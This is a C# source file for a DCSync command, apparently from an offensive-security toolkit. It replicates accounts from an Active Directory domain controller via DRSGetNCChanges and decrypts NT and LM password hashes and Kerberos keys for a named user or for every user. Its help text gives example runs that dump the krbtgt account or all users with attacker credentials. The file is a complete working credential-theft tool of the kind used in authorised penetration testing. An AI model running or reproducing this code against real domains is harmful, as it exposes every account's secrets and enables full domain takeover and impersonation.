using ms_drsr;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Threading;
using System.Threading.Tasks;
using Titanis.Cli;
using Titanis.Msrpc.Msdrsr;

namespace Drsr;

/// <task category="DRS;Replication">Dump credentials from a domain controller</task>
[Command]
[OutputRecordType(typeof(DcSyncResult))]
[Description("Replicates credentials from a domain controller using DRSGetNCChanges (DCSync)")]
[DetailedHelpText(
	"Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights on the domain NC " +
	"(typically held by Domain Admins and Domain Controllers).\n\n" +
	"When -Identity is omitted, all user accounts are replicated from the default naming context.")]
[Example("Dump single user", "{0} DC1.corp.local -UserName attacker@corp.local -Password P@ss -Identity krbtgt")]
[Example("Dump all users", "{0} DC1.corp.local -UserName attacker@corp.local -Password P@ss")]
[Example("Dump single user (Kerberos)", "{0} DC1.corp.local -Tickets /tmp/attacker.ccache -Identity Administrator")]
internal class DcSyncCommand : DrsCommand
{
	[Parameter]
	[Description(
		"Target account to replicate (sAMAccountName, UPN, DN, or SID). " +
		"Omit to replicate all user accounts from the naming context.")]
	public string? Identity { get; set; }

	[Parameter]
	[Description("Naming context (distinguished name) to replicate from. Default: auto-detected from the DC.")]
	public string? NamingContext { get; set; }

	protected override async Task<int> RunAsync(DrsClient client, CancellationToken cancellationToken)
	{
		using var dsa = await client.BindAsync(Guid.NewGuid(), cancellationToken).ConfigureAwait(false);

		// Resolve naming context if not explicitly provided
		string nc;
		if (!string.IsNullOrEmpty(this.NamingContext))
		{
			nc = this.NamingContext;
		}
		else
		{
			nc = await ResolveDefaultNamingContextAsync(dsa, cancellationToken).ConfigureAwait(false);
			this.WriteVerbose($"Using naming context: {nc}");
		}

		string? targetDn = null;
		if (!string.IsNullOrEmpty(this.Identity))
		{
			targetDn = await ResolveIdentityToDnAsync(dsa, this.Identity, cancellationToken).ConfigureAwait(false);
			if (targetDn == null)
			{
				this.WriteError($"Could not resolve identity '{this.Identity}' to a distinguished name.");
				return 1;
			}
			this.WriteVerbose($"Resolved identity to: {targetDn}");
		}

		byte[] sessionKey = client.GetSessionKey();

		// Attribute type IDs for secret attributes (resolved via the prefix table at decode time).
		// We don't filter here; we let the DC send all attributes and decode what we recognise.

		var flags = DRS_OPTIONS.DRS_INIT_SYNC | DRS_OPTIONS.DRS_WRIT_REP | DRS_OPTIONS.DRS_GET_ANC;

		(List<REPLENTINFLIST> entries, SCHEMA_PREFIX_TABLE prefixTable) =
			await dsa.GetNCChangesWithPrefixTableAsync(
				targetDn ?? nc,
				flags,
				partialAttrs: null,
				objectGuid: Guid.Empty,
				cancellationToken).ConfigureAwait(false);

		var results = new List<DcSyncResult>();

		foreach (var entryNode in entries)
		{
			var decoded = DrsAttributeDecoder.Decode(entryNode.Entinf.AttrBlock, prefixTable);

			// Skip objects with no credentials
			if (decoded.EncryptedNtHash == null && decoded.SamAccountName == null)
				continue;

			var result = new DcSyncResult
			{
				SamAccountName = decoded.SamAccountName,
				DistinguishedName = entryNode.Entinf.pName?.value.GetName(),
				Sid = decoded.GetSidString(),
			};

			if (decoded.EncryptedNtHash != null)
			{
				byte[]? ntHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedNtHash, sessionKey);
				if (ntHash != null)
					result.NtHash = Convert.ToHexString(ntHash).ToLowerInvariant();
			}

			if (decoded.EncryptedLmHash != null)
			{
				byte[]? lmHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedLmHash, sessionKey);
				if (lmHash != null && !IsNullHash(lmHash))
					result.LmHash = Convert.ToHexString(lmHash).ToLowerInvariant();
			}

			if (decoded.EncryptedSupplementalCredentials != null)
			{
				KerberosKeys? keys = DrsSecretDecryptor.DecryptSupplementalCredentials(
					decoded.EncryptedSupplementalCredentials, sessionKey);
				if (keys != null)
				{
					result.Aes256Key = keys.Aes256;
					result.Aes128Key = keys.Aes128;
					result.DesKey = keys.DesCbcMd5;
				}
			}

			results.Add(result);
		}

		this.WriteRecords(results);
		return 0;
	}

	/// <summary>
	/// Uses DRSCrackNames to resolve "" (empty name with DS_UNKNOWN_NAME format) to obtain
	/// the default naming context DN of the domain.
	/// </summary>
	private static async Task<string> ResolveDefaultNamingContextAsync(DrsDsa dsa, CancellationToken ct)
	{
		// Crack the RootDSE path: name="" formatOffered=DS_UNKNOWN_NAME, formatDesired=DS_FQDN_1779_NAME
		// This is the standard technique used by tools like Mimikatz and Impacket.
		var result = await dsa.CrackNamesAsync(
			new[] { string.Empty },
			DS_NAME_FORMAT.DS_UNKNOWN_NAME,
			DS_NAME_FORMAT.DS_FQDN_1779_NAME,
			DS_NAME_FLAGS.DS_NAME_NO_FLAGS,
			ct).ConfigureAwait(false);

		if (result.rItems?.value != null && result.rItems.value.Length > 0)
		{
			var item = result.rItems.value[0];
			if (item.IsSuccess() && !string.IsNullOrEmpty(item.pName?.value))
				return item.pName.value;
		}

		// Fallback: attempt to crack the ServerName itself as a domain
		throw new InvalidOperationException(
			"Could not auto-detect the default naming context. " +
			"Please specify -NamingContext explicitly (e.g. DC=corp,DC=local).");
	}

	/// <summary>
	/// Resolves an identity string (sAMAccountName, UPN, SID, or DN) to a DN
	/// using DRSCrackNames.
	/// </summary>
	private static async Task<string?> ResolveIdentityToDnAsync(DrsDsa dsa, string identity, CancellationToken ct)
	{
		// Try as DS_UNKNOWN_NAME first (handles sAMAccountName, UPN, SID, DN)
		var result = await dsa.CrackNamesAsync(
			new[] { identity },
			DS_NAME_FORMAT.DS_UNKNOWN_NAME,
			DS_NAME_FORMAT.DS_FQDN_1779_NAME,
			DS_NAME_FLAGS.DS_NAME_NO_FLAGS,
			ct).ConfigureAwait(false);

		if (result.rItems?.value != null && result.rItems.value.Length > 0)
		{
			var item = result.rItems.value[0];
			if (item.IsSuccess())
				return item.pName?.value;
		}

		return null;
	}

	// The "null" LM hash is aad3b435b51404eeaad3b435b51404ee — indicates no LM hash stored.
	private static readonly byte[] _nullLmHash =
		new byte[] { 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee };

	private static bool IsNullHash(byte[] hash)
	{
		if (hash.Length != 16) return false;
		for (int i = 0; i < 16; i++)
			if (hash[i] != _nullLmHash[i])
				return false;
		return true;
	}
}
